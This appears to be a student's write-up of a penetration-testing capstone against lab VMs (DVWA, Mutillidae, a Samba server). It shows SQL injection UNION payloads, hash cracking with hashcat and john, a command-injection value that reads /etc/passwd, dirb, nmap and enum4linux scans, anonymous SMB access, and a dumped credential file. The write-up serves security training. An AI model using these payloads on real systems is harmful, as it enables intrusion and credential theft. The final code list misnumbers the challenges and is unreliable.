I manged to use sql to show the user database and password.

```
1' OR 1=1 UNION SELECT user_id, password FROM users #
```

![[Pasted image 20240620141258.png]]

I can now crack the passwords with hashcat and john.

```
hashcat -m 0 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt 
```

![[Pasted image 20240620142548.png]]

The first hash is the admin pass that i used to log in.

I did all of the passes just in case they are needed later:

![[Pasted image 20240620144918.png]]

```
john --show --format=RAW-MD5 hashes.txt
```

Having trouble logging in for some reason. I realise i must not have the correct username.

##### Task

###### Locate and open the file with Challenge 1 code.

1. Log into **172.17.0.2** as **Gordon Brown**.
2. Locate and open the flag file in the user's home directory.

I need to find his username so i'm going through some union attacks.

Finding the number of tables

```
1 UNION SELECT null,null--'
```

![[Pasted image 20240620152856.png]]

We can also do `order by` to find the columns:

![[Pasted image 20240620154235.png]]

![[Pasted image 20240620154259.png]]

I try to determine if the columns are strings or numbers by changing the null to either a number or string to see if the server returns an error, in this case they are numbers.

We use the firefox extension hackbar to help us enumerate, but we could have just as easily used Burp:
![[Pasted image 20240620155624.png]]

```
http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=%27 UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()) -- &Submit=Submit#
```

I find some more strings from hacktricks
```
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
```

---

I remembered about command injection and tried to see if i could get a username from that.

```
192.168.78.6;cat /etc/passwd
```

I get gordons username by simply adding on another command to the initial ping, and i'm quite annoyed i didn't try it out already. It must have been one of the only name combos i didn't try, but that's okay! 

![[Pasted image 20240620160856.png]]

We can now log in and finish part one of the capstone, but it's getting late so i'll have to start first thing in the morning. 

Username:gordonb
Password:abc123

Before i finish, i log into the gordonb account to verify it's correct, and it is.

![[Pasted image 20240620161100.png]]

And we get the code:

![[Pasted image 20240620161334.png]]

---

- Which directories can be accessed through a web browser to list the files and subdirectories that they contain?

I perform some recon on DVWA and find that i can access /dvwa directory which contains some folders:
![[Pasted image 20240621050249.png]]

-  View the files contained in each directory to find the file containing the flag.
- In which two subdirectories can you look for the file?

I didn't find anything with zap, so i ran a scan with dirb which revealed more directories

```
dirb http://10.6.6.100/ /usr/share/dirb/wordlists/common.txt
```

![[Pasted image 20240621051749.png]]

I check docs and find three files, when i click on user_form i find the second flag:

![[Pasted image 20240621051717.png]]

---

- Exploit open SMB Server Shares
- Use scanning tools to scan the 10.6.6.0/24 LAN for potential targets for SMB enumeration.
- Which host on the 10.6.6.0/24 network has open ports indicating it is likely running SMB services?
- What shares are listed on the SMB server? Which ones are accessible without a valid user login?
- Locate the file with the Challenge 3 code. Download the file and open it locally.

I do a fastscan on the network:

```
➜  capstone nmap -F 10.6.6.0/24                                          
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-21 04:31 UTC
Nmap scan report for 10.6.6.1
Host is up (0.00055s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for webgoat.vm (10.6.6.11)
Host is up (0.00058s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8080/tcp open  http-proxy
8888/tcp open  sun-answerbook

Nmap scan report for juice-shop.vm (10.6.6.12)
Host is up (0.00059s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3000/tcp open  ppp

Nmap scan report for dvwa.vm (10.6.6.13)
Host is up (0.00060s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for mutillidae.vm (10.6.6.14)
Host is up (0.00049s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql

Nmap scan report for gravemind.vm (10.6.6.23)
Host is up (0.00040s latency).
Not shown: 94 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap scan report for 10.6.6.100
Host is up (0.00049s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 256 IP addresses (7 hosts up) scanned in 2.43 seconds

```

Looks like 10.6.6.23 is vulnerable to a share attack so i'll use enum4linux and see if we can retrieve any information.

```
➜  ~ enum4linux -a 10.6.6.23
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jun 21 04:33:43 2024

 =========================================( Target Information )=========================================

Target ........... 10.6.6.23
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 10.6.6.23 )=============================                                                                                                      
                                                                                                       
                                                                                                       
[E] Can't find workgroup/domain                                                                        
                                                                                                       
                                                                                                       
                                                                                                       
 =================================( Nbtstat Information for 10.6.6.23 )=================================                                                                                                      
                                                                                                       
Looking up status of 10.6.6.23                                                                         
No reply from 10.6.6.23

 =====================================( Session Check on 10.6.6.23 )=====================================                                                                                                     
                                                                                                       
                                                                                                       
[+] Server 10.6.6.23 allows sessions using username '', password ''                                    
                                                                                                       
                                                                                                       
 ==================================( Getting domain SID for 10.6.6.23 )==================================                                                                                                     
                                                                                                       
Domain Name: WORKGROUP                                                                                 
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                   
                                                                                                       
                                                                                                       
 ====================================( OS information on 10.6.6.23 )====================================                                                                                                      
                                                                                                       
                                                                                                       
[E] Can't get OS info with smbclient                                                                   
                                                                                                       
                                                                                                       
[+] Got OS info for 10.6.6.23 from srvinfo:                                                            
        GRAVEMIND      Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian                                         
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =========================================( Users on 10.6.6.23 )=========================================                                                                                                     
                                                                                                       
index: 0x1 RID: 0x3e8 acb: 0x00000015 Account: masterchief      Name:   Desc:                          
index: 0x2 RID: 0x3e9 acb: 0x00000015 Account: arbiter  Name:   Desc: 

user:[masterchief] rid:[0x3e8]
user:[arbiter] rid:[0x3e9]

 ===================================( Share Enumeration on 10.6.6.23 )===================================                                                                                                     
                                                                                                       
                                                                                                       
        Sharename       Type      Comment
        ---------       ----      -------
        homes           Disk      All home directories
        workfiles       Disk      Confidential Workfiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------

[+] Attempting to map shares on 10.6.6.23                                                              
                                                                                                       
                                                                                                       
[E] Can't understand response:                                                                         
                                                                                                       
tree connect failed: NT_STATUS_BAD_NETWORK_NAME                                                        
//10.6.6.23/homes       Mapping: N/A Listing: N/A Writing: N/A
//10.6.6.23/workfiles   Mapping: OK Listing: OK Writing: N/A
//10.6.6.23/print$      Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                         
                                                                                                       
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                             
//10.6.6.23/IPC$        Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 10.6.6.23 )=============================                                                                                                      
                                                                                                       
                                                                                                       

[+] Attaching to 10.6.6.23 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] GRAVEMIND
        [+] Builtin

[+] Password Info for Domain: GRAVEMIND

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                   
                                                                                                       
                                                                                                       
Password Complexity: Disabled                                                                          
Minimum Password Length: 5


 ========================================( Groups on 10.6.6.23 )========================================                                                                                                      
                                                                                                       
                                                                                                       
[+] Getting builtin groups:                                                                            
                                                                                                       
                                                                                                       
[+]  Getting builtin group memberships:                                                                
                                                                                                       
                                                                                                       
[+]  Getting local groups:                                                                             
                                                                                                       
                                                                                                       
[+]  Getting local group memberships:                                                                  
                                                                                                       
                                                                                                       
[+]  Getting domain groups:                                                                            
                                                                                                       
                                                                                                       
[+]  Getting domain group memberships:                                                                 
                                                                                                       
                                                                                                       
 ====================( Users on 10.6.6.23 via RID cycling (RIDS: 500-550,1000-1050) )====================                                                                                                     
                                                                                                       
                                                                                                       
[I] Found new SID:                                                                                     
S-1-22-1                                                                                               

[I] Found new SID:                                                                                     
S-1-5-32                                                                                               

[I] Found new SID:                                                                                     
S-1-5-32                                                                                               

[I] Found new SID:                                                                                     
S-1-5-32                                                                                               

[I] Found new SID:                                                                                     
S-1-5-32                                                                                               

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                            
                                                                                                       
S-1-22-1-1000 Unix User\masterchief (Local User)                                                       
S-1-22-1-1001 Unix User\arbiter (Local User)
S-1-22-1-1002 Unix User\labuser (Local User)

[+] Enumerating users using SID S-1-5-21-3080196717-3701805971-2094628062 and logon username '', password ''                                                                                                  
                                                                                                       
S-1-5-21-3080196717-3701805971-2094628062-501 GRAVEMIND\nobody (Local User)                            
S-1-5-21-3080196717-3701805971-2094628062-513 GRAVEMIND\None (Domain Group)
S-1-5-21-3080196717-3701805971-2094628062-1000 GRAVEMIND\masterchief (Local User)
S-1-5-21-3080196717-3701805971-2094628062-1001 GRAVEMIND\arbiter (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                            
                                                                                                       
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                      
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 =================================( Getting printer info for 10.6.6.23 )=================================                                                                                                     
                                                                                                       
No printers returned.                                                                                  


enum4linux complete on Fri Jun 21 04:34:15 2024

```

Looks like we can login with a blank username and password.

I use smbclient as the question required and list the shares

```
smbclient -L 10.6.6.23/workfiles
```

```
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        homes           Disk      All home directories
        workfiles       Disk      Confidential Workfiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------

```

Then connect

```
smbclient  "//10.6.6.23/workfiles"
```

Find something interesting in print$

```
smb: \other\> get taxtes.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \other\taxtes.txt
smb: \other\> get taxes.txt
getting file \other\taxes.txt of size 103 as taxes.txt (50.3 KiloBytes/sec) (average 50.3 KiloBytes/sec)

```

We find the third flag in the other section of the print$ share:

```
➜  ~ cat taxes.txt 
Congratulations!  
You found the flag for Challenge 3!  
The code for this challenge is A9!15wa2.

```

---

I'm tasked to examine a pcap file in wireshark.

```
➜  ~ cd OTHER 
➜  OTHER ls
SA.pcap
➜  OTHER wireshark SA.pcap 
```

Sorry if this looks a bit confusing, it's just the terminal prompt that is pointing with an arrow, and telling you you're in the **OTHER** directory.

- Analyze the content of the PCAP file to determine the IP address of the target computer and the URL location of the file with the Challenge 4 code.
- What is the IP address of the target computer?
- What directories on the target are revealed in the PCAP?

![[Pasted image 20240621063002.png]]

![[Pasted image 20240621062921.png]]

We find the specified file

![[Pasted image 20240621063152.png]]

```xml
<Employees>
<Employee ID="0">
<UserName>Flag</UserName>
<Password>Here is the Code for Challenge 4!</Password>
<Signature>zz90014x</Signature>
<Type>Flag</Type>
</Employee>
<Employee ID="1">
<UserName>admin</UserName>
<Password>adminpass</Password>
<Signature>g0t r00t?</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="2">
<UserName>adrian</UserName>
<Password>somepassword</Password>
<Signature>Zombie Films Rock!</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="3">
<UserName>john</UserName>
<Password>monkey</Password>
<Signature>I like the smell of confunk</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="4">
<UserName>jeremy</UserName>
<Password>password</Password>
<Signature>d1373 1337 speak</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="5">
<UserName>bryce</UserName>
<Password>password</Password>
<Signature>I Love SANS</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="6">
<UserName>samurai</UserName>
<Password>samurai</Password>
<Signature>Carving fools</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="7">
<UserName>jim</UserName>
<Password>password</Password>
<Signature>Rome is burning</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="8">
<UserName>bobby</UserName>
<Password>password</Password>
<Signature>Hank is my dad</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="9">
<UserName>simba</UserName>
<Password>password</Password>
<Signature>I am a super-cat</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="10">
<UserName>dreveil</UserName>
<Password>password</Password>
<Signature>Preparation H</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="11">
<UserName>scotty</UserName>
<Password>password</Password>
<Signature>Scotty do</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="12">
<UserName>cal</UserName>
<Password>password</Password>
<Signature>C-A-T-S Cats Cats Cats</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="13">
<UserName>john</UserName>
<Password>password</Password>
<Signature>Do the Duggie!</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="14">
<UserName>kevin</UserName>
<Password>42</Password>
<Signature>Doug Adams rocks</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="15">
<UserName>dave</UserName>
<Password>set</Password>
<Signature>Bet on S.E.T. FTW</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="16">
<UserName>patches</UserName>
<Password>tortoise</Password>
<Signature>meow</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="17">
<UserName>rocky</UserName>
<Password>stripes</Password>
<Signature>treats?</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="18">
<UserName>tim</UserName>
<Password>lanmaster53</Password>
<Signature>Because reconnaissance is hard to spell</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="19">
<UserName>ABaker</UserName>
<Password>SoSecret</Password>
<Signature>Muffin tops only</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="20">
<UserName>PPan</UserName>
<Password>NotTelling</Password>
<Signature>Where is Tinker?</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="21">
<UserName>CHook</UserName>
<Password>JollyRoger</Password>
<Signature>Gator-hater</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="22">
<UserName>james</UserName>
<Password>i<3devs</Password>
<Signature>Occupation: Researcher</Signature>
<Type>Admin</Type>
</Employee>
<Employee ID="23">
<UserName>ed</UserName>
<Password>pentest</Password>
<Signature>Commandline KungFu anyone?</Signature>
<Type>Admin</Type>
</Employee>
</Employees>
```

- Use a web browser to investigate the URLs listed in the Wireshark output. Find the file with the code for Challenge 4.
- What is the URL of the file?

![[Pasted image 20240621063415.png]]

Code: `zz90014x`
URL: `http://mutillidae.vm/data/accounts.xml`

Final Answer:
First Code: 4E9f12  _or_ 4E9f12.
Second Code: 18xf9-4z 
Third Code: zz90014x
 
 The first code may end it a period character. I couldn't tell if it was just a full stop or part of the code. 
